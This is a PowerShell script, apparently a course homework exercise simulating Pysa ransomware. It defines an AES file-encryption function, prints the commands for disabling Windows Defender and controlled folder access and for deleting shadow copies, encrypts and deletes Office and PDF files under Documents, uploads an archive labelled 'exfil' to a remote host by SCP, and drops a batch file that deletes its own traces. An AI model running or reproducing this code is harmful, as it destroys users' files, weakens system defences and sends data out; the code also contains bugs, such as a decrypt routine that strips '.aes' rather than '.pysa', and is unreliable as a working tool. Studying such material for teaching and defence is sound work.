# Source: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
# Encrypts file
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Task 2
# Simluate disabling defender and controlled folder access
# Simulate removing restore points (do not actually remove)

Write-Host 'Disabling Windows Defender and Controlled Folder Access:'
Write-Host 'Set-MpPreference -DisableRealtimeMonitoring $true'
Write-Host 'Set-MpPreference -EnableControlledFolderAccess Disabled'

Write-Host '\nRemoving restore points and shadow copies:'
# Note: The assignment asks for a PowerShell cmdlet, however I was unable to find one.
# This command should work though
# Ref: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-delete-shadows
Write-Host 'vssadmin delete shadows /for=<ForVolumeSpec> /quiet /all'

# Get list of child items in Documents
Get-ChildItem -Recurse -Include *.docx, *.pdf, *.xlsx -Path .\Documents | Export-Csv `
    -Path files.csv

# Import CSV file.
$fileList = Import-Csv -Path .\files.csv # -Header FullName

# Create name of tempdir for zipping
$tempdir = "temp_zip"

# Create destination for copy
New-Item -ItemType Directory -Path $tempdir

# Loop through the results
foreach ($f in $fileList) {

    # First encrypt the file
    Invoke-AESEncryption -Mode Encrypt -Key "SuperS3cur3PysaP@ssword" -Path $f.FullName

    # Then remove the unencrypted version
    Remove-Item -Path $f.FullName

}

# Create zip output name
$outfile = (Get-Date -Format "yyyy-MM-dd-HHmm") + "-exfil.zip"

# Zip the tempdir
Compress-Archive -Update -Path $tempdir -DestinationPath $outfile

# Copy zip file to remote host
Set-SCPItem -ComputerName "192.168.6.71" -Port 2222 -Credential (Get-Credential reed.simon) `
    -Path $outfile -Destination "/home/reed.simon/"

# Remove the tempdir and the zip after copying
Remove-Item -Recurse -Path $tempdir
Remove-Item $outfile

# Contents of update.bat
$updateBat = @"
@ECHO OFF
DEL step2.ps1
DEL files.csv
"@

# Directory in which to write update.bat (destination)
$sbDir = 'D:\school-files\SYS320-SP22\Week12\homework\'

# Create the filename
$file = $sbDir + "update.bat"

# Write to a file
$updateBat | Out-File -FilePath $file

# Executes the dropped batch file
Start-Process -FilePath $file
